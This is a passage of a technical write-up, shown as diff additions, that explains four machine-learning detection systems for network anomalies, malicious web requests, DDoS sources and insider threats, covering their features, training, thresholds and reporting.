+The Isolation Forest operates on the principle that anomalies are easier to "isolate" than normal data points. It builds a forest of random decision trees, where for each tree, it randomly selects a feature and a split point for that feature to recursively partition the data. Anomalous points, being "few and different," require fewer partitions to be isolated. For instance, finding a person in a bright red coat in a crowd wearing black is quick if you randomly divide the crowd repeatedly. Normal data points require more splits as they are part of the dense crowd. The Isolation Forest excels at identifying statistical outliers—events with feature values that are numerically distant from the norm. 
+Model 2: The Autoencoder (The "Reconstruction" Expert)
+An Autoencoder is a neural network trained to reconstruct its own input. It consists of an encoder that compresses the input data into a lower-dimensional representation and a decoder that recreates the original data from this compressed form. The model is trained exclusively on normal network traffic data. An analogy is an art forger who has only studied genuine Monet paintings; their attempt to reproduce a fake will be flawed because it doesn't match the learned patterns. The magnitude of these errors, the "reconstruction error," signals that something is amiss. The Autoencoder is adept at learning the complex, underlying patterns of normal behavior and flags anomalies when it cannot accurately reconstruct data, resulting in a high reconstruction error. 
+1.3. The End-to-End Prediction Process
+The system follows a multi-stage process: 
+Feature Engineering: Raw network logs (e.g., source/destination IP, packets, bytes) are converted into numerical features like Packets_Per_Second and Device_Workload_Ratio. 
+Dual Prediction: The processed data is fed to both models simultaneously. The Isolation Forest calculates an anomaly score, and the Autoencoder calculates a reconstruction error. 
+Hybrid Verdict: A data point is flagged as a potential anomaly if the Isolation Forest score is negative OR the Autoencoder's reconstruction error is above a set threshold. 
+Rule-Based Analysis Engine: Flagged events are passed to this engine to determine a specific Reason and Severity. It uses if/else rules based on dynamic thresholds (e.g., 
+if row['Packets_Per_Second'] > threshold) to check for known attack patterns like DDoS amplification or data exfiltration, translating the model's output into human-readable insights. 
+1.4. Conclusion: The Synergy Advantage
+Combining these models creates a more effective system than either would be alone. The Isolation Forest catches statistical outliers, while the Autoencoder detects subtle deviations from learned normal patterns. This synergistic approach ensures a higher detection rate and greater resilience against a wider variety of threats. 
+2. Anomaly Detection for Web Server Logs
+2.1. Executive Summary
+A Feedforward Neural Network (FNN) was chosen for identifying malicious web server requests. This model acts as a binary classifier, distinguishing between 'good' (normal) and 'bad' (malicious) requests. The FNN is effective due to its ability to learn complex, non-linear patterns from log data, moving beyond simple rule-based detection. It has been trained and implemented to analyze new web requests and flag potential threats in real-time. 
+2.2. Model Selection and Rationale
+
+The FNN was selected for its ability in complex pattern recognition, learning subtle relationships between multiple input features (e.g., path_length, badwords_count, and angle_brackets). The network automatically determines the importance of each feature during training, assigning more weight to strong indicators of an attack. After training on diverse data, the FNN can generalize its knowledge to identify new, previously unseen attacks that share similar characteristics with the training data. The training process also incorporates a class_weight mechanism to handle the imbalance between normal and malicious requests, forcing the model to pay special attention to 'bad' requests. 
+
+
+
+
+
+2.3. How the Model Works
+
+The process involves four steps: 
+
+
+Feature Engineering: Raw text logs are converted into numerical features such as counts of special characters (single_q, semicolons), suspicious keywords (badwords_count), and numerical properties like path_length. The request method (e.g., GET, POST) is one-hot encoded. 
+
+
+
+Data Scaling: A StandardScaler is used to normalize all features to a similar range, ensuring no single feature unfairly dominates the learning process. 
+
+
+Model Training: The scaled data is fed into the FNN. The model makes a prediction, compares it to the actual label ('good' or 'bad'), calculates a binary_crossentropy loss, and uses an Adam optimizer to adjust its weights. This cycle is repeated for 50 epochs, and the trained model is saved. 
+
+
+
+
+Threat Prediction: For a new file, the saved model and scaler are loaded. Each new request undergoes the exact same feature engineering and scaling. The model outputs a probability score; if it's above a 0.5 threshold, the request is flagged as 'bad'. 
+
+
+
+3. DDoS Attack Detection and Culprit Identification System
+
+3.1. Overview
+
+This system detects Distributed Denial-of-Service (DDoS) attacks and identifies their sources using two scripts: one for training a model and one for analyzing traffic to find culprits. A DDoS attack aims to disrupt a service by overwhelming it with a flood of internet traffic. This is analogous to a crowd blocking the entrance to a shop, preventing legitimate customers from entering. The goal is to make the service unavailable. 
+
+
+
+
+Key Terminology
+
+
+Botnet: A network of compromised private computers controlled as a group. 
+
+
+Zombies: Individual compromised computers within a botnet. 
+
+
+Traffic Flood: The overwhelming volume of data packets sent to the target. 
+
+
+Benign Traffic: Normal, legitimate user traffic. 
+
+
+Malicious Traffic: Fake traffic generated by a botnet. 
+
+3.2. How the System Works
+
+The system operates in two phases: 
+
+Phase 1: Training the Model
+
+This phase builds a model that can differentiate between benign and malicious traffic. 
+
+
+Data Preparation: The system loads a historical dataset containing both normal and DDoS traffic examples, with features like packet rate and protocol type. After cleaning the data, features (X) are separated from labels (y). Categorical data like 'Protocol' is converted to a numerical format using one-hot encoding. 
+
+
+
+
+Training and Testing Split: The data is split into a training set (80%) and a testing set (20%). A StandardScaler normalizes feature values to prevent any single feature from disproportionately influencing the model. 
+
+
+
+Model Training: A Random Forest Classifier is trained on the scaled training data. A Random Forest is an ensemble method that builds multiple decision trees for more accurate predictions. 
+
+
+
+
+Evaluation and Saving: The model's performance is tested on the unseen test data, and an accuracy score and classification report are printed. The trained model (
+
+ddos_model.joblib), the scaler (scaler.joblib), and the feature column order (training_columns.txt) are saved. 
+
+Phase 2: Finding the Culprits
+
+This phase uses the saved model to analyze new traffic. 
+
+
+Loading Artifacts: The pre-trained model, scaler, and training columns are loaded. 
+
+
+Processing New Data: New data undergoes the exact same preprocessing steps as the training data, including one-hot encoding and scaling, to ensure consistency. 
+
+
+Prediction and Analysis: The model predicts the probability of each network flow being malicious. Any flow with a probability greater than 50% is flagged as an attack. For each malicious flow, a severity score (1-3) and a reason (e.g., "High Packet Rate") are assigned. 
+
+
+
+
+Generating Report: The script aggregates malicious traffic by source IP address and creates a report summarizing each attacking IP's activity, including malicious request count, average severity, primary target, and common reason. This report is saved as a CSV file. 
+
+
+4. Insider Threat Detection Systems
+
+4.1. Overview and Approach
+
+Insider threats originate from within an organization, involving individuals with authorized access who misuse it. Examples include data exfiltration, sabotage, or espionage. These are difficult to detect as the individuals use legitimate credentials. 
+
+
+
+
+To address this, an unsupervised machine learning approach using the Isolation Forest algorithm is employed. This model does not require pre-labeled examples of threats. Instead, it learns the underlying patterns of normal user behavior from raw data and identifies significant deviations, or anomalies. 
+
+
+
+
+
+4.2. How the Isolation Forest Model Works
+
+The Isolation Forest algorithm is based on the principle that anomalies are "few and different" and thus easier to isolate. It builds many random decision trees. Anomalous data points are separated quickly with few splits, resulting in a short "path length." Normal data points are more clustered and require more splits to be identified, leading to a long "path length." A user's final anomaly score is based on their average path length across all trees. A lower score indicates a higher likelihood of being an anomaly. 
+
+
+
+
+
+4.3. System Functionality: A Two-Phase Process
+
+Phase 1: Training the Model (Learning What's Normal)
+
+The first script creates a behavioral baseline from historical data. 
+
+
+Data Loading and Feature Engineering: Data from various logs (logon, device, http, email, file, psychometric, LDAP) is loaded and processed. This raw data is transformed into a meaningful behavioral profile for each user. 
+
+
+
+Features for 
+
+Dataset 2 include: logon_count, after_hours_logon_count, unique_pcs_accessed, emails_sent, total_email_size, file_copy_count, and psychometric scores. 
+
+Features for 
+
+Dataset 1 include: logon_count, after_hours_logon_count, unique_pcs_accessed, device_connect_count, after_hours_connect_count, and http_activity_count. 
+
+
+
+Model Training: The Isolation Forest model is trained on these user profiles to learn what constitutes "normal" behavior. A 
+
+
+contamination parameter, based on prior knowledge about the dataset, is used to hint at the expected percentage of anomalies. 
+
+
+
+Saving Artifacts: The trained model (Dataset 2.joblib) and a StandardScaler (scaler.joblib) are saved. 
+
+Phase 2: Detecting Threats (Finding Anomalies)
+
+The second script uses the trained model to analyze new data. 
+
+
+Loading and Processing: The saved model and scaler are loaded. New log data is loaded and undergoes the exact same feature engineering process to create new user profiles. 
+
+
+
+Prediction and Scoring: The profiles are fed into the model, which assigns an anomaly score (threat_score) to each user. Users with a score below a certain threshold are marked as potential threats. 
+Analysis and Reporting: For flagged users, a human-readable "Reason" is generated by comparing the user's activity (e.g., file_copy_count) to the 95th percentile of that activity across all users. A severity level (1-3) is assigned based on the anomaly score and the number of suspicious activities. A high severity rating is given for exceptionally low scores or multiple flagged reasons. The final output is a CSV file listing potential threats, their scores, severity, and the reasons for the flag.
